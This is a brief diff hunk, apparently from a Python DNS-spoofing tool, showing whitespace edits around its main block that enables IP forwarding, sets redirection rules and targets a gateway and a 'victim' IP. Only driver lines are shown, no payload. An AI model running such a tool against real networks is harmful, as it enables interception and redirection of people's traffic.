@@ -167,10 +167,10 @@ if __name__ == '__main__':
 	parser.add_argument("-f", "--filter", required=False, default="udp port 53", help="Capture Filter.")
 	
 	args = parser.parse_args()
+		
 	dnsSpoof = DNSSpoofing(args.interface, args.filter, args.route)	
 	dnsSpoof.enableForwarding()
-	dnsSpoof.redirectionRules()	
-
+	dnsSpoof.redirectionRules()
 	
 	gateway_ip = args.gateway
 	victim_ip  = args.target
